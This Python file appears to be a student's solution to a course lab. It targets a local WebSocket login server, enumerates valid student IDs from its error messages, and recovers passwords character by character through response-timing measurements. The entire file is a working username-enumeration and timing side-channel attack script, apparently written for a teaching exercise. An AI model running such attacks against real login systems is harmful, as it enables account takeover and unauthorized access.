from ast import main
import asyncio, websockets
from json import dumps, loads
from time import sleep
import time

async def client_connect(username, password, variance=0.0):
    """Handle sending and receiving logins to & from the server.
    'while True' structure prevents singular network/socket
    errors from causing full crash.

    Parameters
    ----------
        username -- string of student ID for login attempt
        password -- string of password for login attempt
        variance -- float of maximum network delay

    Returns
    -------
        reply -- string of server's response to login attempt
    """

    #server_address = "ws://20.224.193.77:3840"
    server_address = "ws://127.0.0.1:3840"
    
    while True:
        try:
            async with websockets.connect(server_address) as websocket:
                #await websocket.send(dumps([username,password,variance]))
                await websocket.send(dumps([username, password]))
                reply = await websocket.recv()
            return loads(reply)
        except:
            continue

def call_server(username, password, variance=0.0):
    """Send a login attempt of username + password to the server
    and return the response. Optionally takes the variable variance to
    allow simulation of random network delays; the server will then
    delay its response by n microseconds, where 0 < n < variance.
    A higher variance will make guessing the password harder.


    Parameters
    ----------
        username -- string of student ID for login attempt
        password -- string of password for login attempt
        variance -- float of maximum delay, must be greater than 0.000001

    Returns
    -------
        reply -- string of server's response to login attempt
    """  

    reply = asyncio.get_event_loop().run_until_complete(client_connect(username,password,variance))
    sleep(0.001) # Wait so as to not overload the server with 90 students at once!
    return (reply)


def find_username(start_number, end_number):
    """This function tries to login to the server using a linearly
    increasing student number combined with a fake password. If the
    server responds that the password is incorrect, than we know that
    the student number exists.

    Parameters
    ----------
        start_number -- int for which to start the guessing range
        end_number -- int to stopp the guessing range


    Returns
    -------
        username_list -- list with valid usernames   
    """

    username_list = []

    for i in range(start_number, end_number):
        # Err_0: You have submitted too much data. Your student number should be six characters, 
        # and the password less than twenty.
        # Therefore:
        # Convert the number to a string and fill with leading zeros up to 6 characters
        student_number = str(i).zfill(6)

        # Give the number to the server
        respons = call_server(student_number,'a')
        
        # If password is incorrect, than student number is known aka add it to the known list
        if respons == "Incorrect password. Access Denied.":
            username_list.append(student_number)
    
    return username_list


def find_password_length_2(username_list):
    """Try and guess the length of the password. Since the function first checks the length,
    and when that is correct the first number, the highest response SHOULD be the correct length.

    Parameters
    ----------
        username_list -- list with valid usernames

    Returns
    -------
        stu_number_and_length -- dictionary with the student number and the guessed password length 
    """
    
    time_length = {}
    for student_number in username_list:
        time_length[student_number] = []
        password = ""
        for length in range(1, 11):  # Assuming you want to test up to 10 characters
            password = "a" * length

            duration_list = []
            for _ in range(50):  # Reduced number of calls for efficiency
                start_time = time.perf_counter()
                call_server(student_number, password)
                end_time = time.perf_counter()
                duration = end_time - start_time
                duration_list.append(duration)
            
            average_value = sum(duration_list) / len(duration_list)
            time_length[student_number].append((length, average_value))

    stu_number_and_length = {}
    #print(time_length)
    for student_number, lengths in time_length.items():
        password_length = 0
        password_time = 0

        for length, times in lengths:
            if times > password_time:
                password_time = times
                password_length = length
        
        stu_number_and_length[student_number] = password_length
    
    return stu_number_and_length


def increment_char(c):
    """Increment the given character, by converting it into unicode, incrementing
    it and than converting it back to a character

    Parameters
    ----------
        c -- character that ahs to be incremented

    Returns
    -------
         -- character that has been incremented by one
    """
    if '0' <= c <= '8':
        return chr(ord(c) + 1)
    elif c == '9':
        return 'a'
    elif 'a' <= c <= 'y':
        return chr(ord(c) + 1)
    else:  # c == 'z', shouldn't happen but this is yust in case
        return '0'
    

def find_password(stu_length_dict):
    """Guesses the password, based on the response time and the given password length

    Parameters
    ----------
        stu_length_dict -- dictionary with the student number and the guessed password length 

    Returns
    -------
        passwords -- dictionary with the student number and the guessed password
    """
    
    passwords = {}
    for stu_number, passwd_length in stu_length_dict.items():

        # To start, create a list filled with 0's equal to the discovered length
        guess_list = ['0'] * passwd_length
        
        for x in range(passwd_length):
            char_time_dict = {}

            #while guess_list[x] != 'z':
            while True:
                
                duration_list = []
                #passwd_string = str(guess_list)
                passwd_string = ''.join(guess_list)

                # Send x amount of times
                for _ in range(25):
                    start_time = time.perf_counter()
                    call_server(stu_number, passwd_string)
                    end_time = time.perf_counter()
                    duration_list.append(end_time - start_time)

                # Calculate the average of the character
                average_value = sum(duration_list) / len(duration_list)

                # Add the character and the average time to a dict
                char_time_dict[guess_list[x]] = average_value

                # 'z' is the last to check, so if we checked it break the loop
                if guess_list[x] == 'z':
                    break  # Exit the loop after 'z'

                # Increment the char 
                guess_list[x]= increment_char(guess_list[x])

            # Get the character with the highest responsetime
            '''
            character = ""
            timing = 0
            for char, value in char_time_dict:
                if value > timing:
                    character = char
                    timing  = value
            '''
            character, timing = max(char_time_dict.items(), key=lambda kv: kv[1])

            # Set that character on the index, to guess the next number
            guess_list[x] = character 

        passwords[stu_number] = ''.join(guess_list)

    return passwords


def main():
    # Find all valid student numbers
    # On the doker image there is only one username being 000000, therefore for testing I am only giving it a range of 10
    username_list = find_username(0, 10)
    print(username_list)

    # Find for each valid student their password length
    stu_number_and_length_dict = (find_password_length_2(username_list))
    print(stu_number_and_length_dict)

    stu_number_and_password_dict = find_password(stu_number_and_length_dict)
    print(stu_number_and_password_dict)
    
    for student_number, password in stu_number_and_password_dict.items():
        print(call_server(student_number, password))

    #print(call_server("000000", "hunter2"))


if __name__ == "__main__":
    main()